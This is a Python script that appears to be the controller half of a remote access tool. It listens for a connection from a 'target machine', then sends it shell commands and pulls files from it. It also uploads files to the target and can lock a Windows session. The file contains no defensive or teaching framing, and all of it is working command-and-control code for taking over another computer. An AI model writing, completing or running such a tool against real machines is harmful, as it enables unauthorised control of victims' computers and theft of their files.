import socket
import time


IP = '' # Add the IP of the target machine
PORT = '' # Add port 
PREFIX = 'utf-8'# 'ISO-8859-7'
WIN_PREFIX = 'utf-8'#"windows-1252"

#Create connection by binding a socket
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

listener.bind((IP, PORT))
listener.listen()

print("Server started.")
conn, address = listener.accept()
print(f"{address} has connected.")

def send_data(output_data):
    size_of_data = len(output_data)
    size_of_data = str(size_of_data)
    conn.send(bytes(size_of_data, PREFIX))
    time.sleep(2)
    conn.send(output_data)

def recv_data():
    original_size = conn.recv(2048).decode(PREFIX)
    original_size = int(original_size)
    data = conn.recv(2048)

    while len(data) != original_size:
        data = data + conn.recv(2048)
    return data

while True:
    try:
        cmd = input("Enter a command:")
        conn.send(bytes(cmd, PREFIX))

        # Exit connection
        if cmd == 'quit':
            conn.send(b'quit')
            conn.close()
            break

        # Move threw directories
        elif cmd[:2] =='cd':
            conn.send(bytes(cmd, PREFIX))
            recv = recv_data() # bytes
            print(recv.decode(PREFIX))
            continue

        # Download a file
        elif cmd[:8] == 'download':
            conn.send(bytes(cmd, PREFIX))
            file_output = recv_data()

            if file_output == b"[download] - File does not exist.":
                print(file_output.decode(PREFIX))
                continue

            with open(f'{cmd[9:]}', 'wb') as write_data:
                write_data.write(file_output)
                write_data.close()
            continue

        # Upload a file
        elif cmd[:6] == 'upload':
            with open(f"{cmd[7:]}", "rb") as data:
                f_data = data.read()
                data.close()
            send_data(f_data)
            continue


        # Lock windows
        elif cmd[:4] == 'lock':
            conn.send(b"lock")




        output = recv_data()
        print(output.decode(WIN_PREFIX))

    except FileNotFoundError:
        print('File not found.')
